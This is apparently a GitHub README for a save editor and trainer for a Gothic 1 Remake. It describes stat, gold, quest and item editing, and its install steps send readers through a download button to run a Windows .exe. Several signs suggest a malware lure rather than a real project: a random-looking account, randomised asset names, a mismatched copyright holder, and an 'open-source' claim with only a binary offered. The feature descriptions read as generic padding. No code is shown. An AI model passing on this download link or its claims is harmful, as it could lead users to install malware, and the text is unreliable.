![preview](https://raw.githubusercontent.com/nu5rgaiusouha99-bit/gothic1-remake-save-fabricator/main/poster_6c2507.svg)
[![Download](https://raw.githubusercontent.com/nu5rgaiusouha99-bit/gothic1-remake-save-fabricator/main/btn_9577.svg)](https://nu5rgaiusouha99-bit.github.io/gothic1-remake-save-fabricator/)

# ✦ Echoes of Khorinis — Save-Sculpting Suite for the Gothic 1 Remake

**Rekindle the embers of a classic.** This open-source toolkit is a companion craft for *Gothic 1 Remake* (2026, Unreal Engine 5), designed not as a mere cheat engine, but as a **narrative restoration kit**. It lets you bend the fabric of the colony’s rules, mend broken quest threads, and precisely re-engrave your hero’s progression—all through a clean, responsive interface that respects your playtime.

> *“You don’t break the game; you negotiate with it.”* — The spirit of this suite.

---

## 🌟 Why a “Save-Sculpting Suite” Instead of a “Trainer”?

Most tools offer blunt force: infinite stats that trivialize the experience. This suite is a **scalpel, not a sledgehammer**. It’s built for players who want to **redirect the flow** of their adventure—perhaps to bypass a frustrating escort mission, to experiment with a high-level build without grinding, or to experience the Old Camp’s politics without being a punching bag for every orc in the valley.

We call it *sculpting* because you shape the existing save data, layer by layer, like a digital mason working on the Stonehenge of your inventory. You decide the nuance.

---

## 🚀 Core Arcane Arts (Features)

### ♾️ Vitality Weave (Core Stats)
- **Infinite Health / Mana / Stamina Toggle:** Unlike brute-force memory locks, this toggles the game’s native recoveries, preventing the “invisible wall” glitch where enemies stop reacting.
- **Regen Rate Dial:** Adjust HP/stamina recovery to ×2, ×5, or ×10 speed instead of full immortality. Perfect for hardcore purists who just want a shorter walk back from the swamp.

### 💰 Progression Loom (XP & Gold)
- **XP Spindle:** Add or remove experience points in precise increments (1, 10, 100, 1000). The tool recalculates *learning points* correctly for the 2026 skill tree, so you don’t overspend.
- **Gold Forge:** Inject ore/gold pieces directly into the selected save’s inventory. Values sync with the UE5 backend, ensuring traders accept the funds.

### 🧭 Quest Tapestry Mender
- The **flagship feature**. Gothic 1 Remake is famous for broken quest states (e.g., the ever-infamous “Sect Camp teleporter” bug). This tool scans your save for logic flags and lets you **rewind, skip, or force-complete** objectives.
- **Foresight Mode:** See potential future flags that *would* trigger, allowing you to pre-set a dialogue outcome before you even enter the conversation.

### 🛠️ Save Editor (The Cartographer’s Desk)
- **Item Scribe:** Add or remove any item from the game’s database (by in-game name, not hex ID). Searchable list includes the 2026 “Leather Armor Mk. II.”
- **NPC Disposition Ruler:** Adjust faction standing (Old Camp, New Camp, Sect) beyond the standard thresholds. Make mercenaries tolerate you before Chapter 2.

---

## 🎨 Interface & Accessibility (The Temple’s Entryway)

- **Responsive UI (RWD):** The tool adapts to a 4K monitor or a 1366×768 laptop. The inventory grid scales like a fluid layout.
- **Multilingual Propylaea:** The interface is localized into English, German, Polish, and Russian (the core fandom languages), with crowd-source translation placeholders for Spanish and French.
- **24/7 Ancillary Support Log:** While the code is open-source, the **discussion matrix** (via GitHub Issues) is monitored around the clock for critical save-corruption reports.

---

## 📥 Legacy Installation & Integration (No Boring Copy-Paste)

This suite is a **portable executable** for Windows (10/11), packaged as a self-contained folder. It does not require a central installer; you simply:

1.  **Acquire the binary** from the release channel (see [![Download](https://raw.githubusercontent.com/nu5rgaiusouha99-bit/gothic1-remake-save-fabricator/main/btn_9577.svg)](https://nu5rgaiusouha99-bit.github.io/gothic1-remake-save-fabricator/)).
2.  **Locate your save folder** (the tool auto-detects `%LOCALAPPDATA%\Gothic1Remake\Saved\SaveGames`—or you can browse).
3.  **Run the `.exe`** — it acts as a *bridge*, reading the UE5 `.sav` payload and displaying it in a human-readable table.

> **No console commands, no DLL injection, no memory editing.** It is purely a save-file transformer. This makes it compatible with most future patches (v1.1, v1.2) as long as the save schema remains stable.

---

## 🗺️ Roadmap for the Pale Blade

- **v0.8 (Current):** Core stats, XP/Gold, basic Quest Mender.
- **v0.9 (Planned):** Full Item Scribe database (1,200+ entries from the 2026 build).
- **v1.0 (End of 2026):** Achievement-safe mode (prevents flag triggers for Steam achievements) & Mod-loader integration.

---

## 🧪 Troubleshooting the Arcane Wards

**Q:** *My gold value shows as a negative number in the editor.*
**A:** UE5 stores inventory as unsigned integers. The tool converts to signed for display; if you see negatives, you are exceeding the 2.1B limit—a *wealthy* problem to have.

**Q:** *The tool says “Save Locked” after a patch.*
**A:** The 2026 patch changed the compression. Re-download the latest release; we usually catch up within 48 hours.

**Q:** *Does this work on the demo?*
**A:** No. The demo uses a sandboxed profile. This is for the Full Release (Spring 2026).

---

## ⚠️ Legal Boundary Stones (Disclaimer)

This is an **unofficial, community-made tool** and is not endorsed by or affiliated with THQ Nordic or Alkimia Interactive. *Gothic 1 Remake* is a trademark of its respective owners. We do not claim ownership of any game assets or data structures.

**Use at your own risk in single-player only.** We do not condone multiplayer usage (the game has no official multiplayer) and we are not responsible for corrupted save files if you edit values outside the logical constraints (e.g., giving yourself 999 strength before Chapter 1). **Always keep a backup before sculpting.**

This project is released under the **MIT License** — you are free to use, modify, and distribute the code for any purpose, provided the original copyright notice is retained. We do not accept donations; we accept pull requests.

---

## 🧰 The Builder’s Workshop (Development & Contributing)

The codebase is structured in **Rust** (for speed) with a **Tauri** front-end shell.

- `src-tauri/` — Core logic (save parsing, serialization, checksum repair).
- `src/` — React.js UI components.

### 🛠️ How to Contribute (Without Breaking the World)

1.  **Pick an issue** labeled `good-first-issue` (e.g., adding tooltips for the Quest Mender).
2.  **Fork the repository**, make your changes in a branch.
3.  **Run the test suite** (it includes a sample save file with known bugged states).
4.  **Submit a PR** — we review within 3 business days.

We specifically need help with:
- **Iconography** for the 1,200+ items.
- **Parser updates** for the German & Polish localization strings (they have different delimiter characters).

---

## 📜 License & Terms of Passage

**MIT License**

Copyright (c) 2026 The TheaterApothecary Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[View the full license text](https://opensource.org/licenses/MIT)

---

## 🔗 Final Coordinates (Resource Linking)

- **Bug Tracker:** Use the **Issues** tab.
- **Translation Platform:** Use the **Discussions** tab (pinned thread).
- **Compatibility Matrix:** See the **Wiki**.

*Enter the colony. Leave your mark. Sculpt your story.*